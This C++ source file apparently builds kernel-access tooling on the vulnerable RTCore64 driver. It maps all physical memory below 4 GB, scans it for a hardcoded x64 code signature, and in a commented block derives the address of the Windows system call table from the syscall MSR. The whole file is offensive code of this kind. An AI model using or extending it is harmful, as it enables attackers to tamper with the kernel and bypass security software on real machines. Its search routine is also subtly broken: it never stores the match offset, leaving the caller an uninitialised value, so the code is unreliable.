#include <windows.h>
#include <iostream>
#include "ReadWrite.h"
#include "Structures.h"
#include "CommWithDriver.h"


CommWithDriverManager manager;

const BYTE buffer[] = {
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0xc4, 0x53, 0x48, 0x83, 0xec, 0x60,
0x48, 0x83, 0x60, 0x18, 0x00, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x15, 0x11, 0x07, 0x00, 0x00, 0x48,
0x8d, 0x48, 0xd8, 0xff, 0x15, 0x1f, 0x10, 0x00, 0x00, 0x4c, 0x8d, 0x9c, 0x24, 0x80, 0x00, 0x00,
0x00, 0x4c, 0x8d, 0x44, 0x24, 0x40, 0x4c, 0x89, 0x5c, 0x24, 0x30, 0x41, 0xb9, 0x50, 0xc3, 0x00,
0x00, 0x33, 0xd2, 0x48, 0x8b, 0xcb, 0xc6, 0x44, 0x24, 0x28, 0x00, 0xc7, 0x44, 0x24, 0x20, 0x00,

};
/*
TRUE if it finds. The offset from startAddress is in *storeOffset.
*/
BOOL searchBufferInVirtualMemory(PVOID startAddress, DWORD searchLength, BYTE* buffer, DWORD bufferLength, DWORD* storeOffset) {
    BYTE* currentAddress = (BYTE*)startAddress;
    int i;

    for (DWORD offset = 0; offset + bufferLength < searchLength; ++offset) {
        for (i = 0; i < bufferLength && *(currentAddress + offset) == buffer[i]; ++i);
        if (i == bufferLength) return TRUE;
    }

    return FALSE;
}


BOOL searchBufferInPhysicalMemory(PVOID startAddress, PVOID endAddress, BYTE* buffer, DWORD bufferLength, CommWithDriverManager& manager, PVAddress_t* toStore) {
    DWORD chunkSize = max(4096, bufferLength);

    PVOID mapAddress;
    DWORD offset;

    BYTE* currentAddress;
    for (currentAddress = (BYTE*)startAddress; currentAddress + (chunkSize - 1) <= endAddress; currentAddress += chunkSize) {
        if (!manager.mapPhysicalAddressToVirtual(currentAddress, chunkSize, &mapAddress)) {
            printf("%d\n", GetLastError());
        }
        printf("%p\n", currentAddress);
        if (searchBufferInVirtualMemory(mapAddress, chunkSize, buffer, bufferLength, &offset)) {
            toStore->physicalAddress = currentAddress + offset;
            toStore->virtualAddress = (BYTE*)mapAddress + offset;
            return TRUE;
        }

        manager.unmapPhysicalAddressToVirtual(mapAddress);   
    }

    if (currentAddress + (bufferLength - 1) <= endAddress) {
        chunkSize = (BYTE*)endAddress - currentAddress + 1;

        manager.mapPhysicalAddressToVirtual(currentAddress, chunkSize, &mapAddress);

        if (searchBufferInVirtualMemory(mapAddress, chunkSize, buffer, bufferLength, &offset)) {
            toStore->physicalAddress = currentAddress + offset;
            toStore->virtualAddress = (BYTE*)mapAddress + offset;
            return TRUE;
        }

        manager.unmapPhysicalAddressToVirtual(mapAddress);
    }

    return FALSE;


}


int main() {
    HANDLE device = manager.initializeDevice(L"\\\\.\\RTCore64");


    PVAddress_t pvAddress{};
    BOOL b = searchBufferInPhysicalMemory((PVOID)0, (PVOID)0xffffffff, (BYTE*)buffer, sizeof(buffer), manager, &pvAddress);
    if (b) {
        printf("%p, %p\n", pvAddress.physicalAddress, pvAddress.virtualAddress);
    }



    //HANDLE device = CreateFileW(L"\\\\.\\NTIOLib_MB", GENERIC_READ | GENERIC_WRITE, NULL, 0, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    //
    //PVOID KiSystemCall64;
    //readMSR(device, 0xc0000082, (QWORD*)&KiSystemCall64); //0xc0000082
    //printf("%llx\n", KiSystemCall64);
    //
    //
    //PVOID KeServiceDescriptorTable = (BYTE*)KiSystemCall64 + 0x374 + 0x9f0b4c;
    //PVOID KeServiceDescriptorTableShadow = (BYTE*)KiSystemCall64 + 0x37b + 0x8ebcc5;
    // 
    //
    //printf("%llx, %llx\n", KeServiceDescriptorTable, KeServiceDescriptorTableShadow);

}
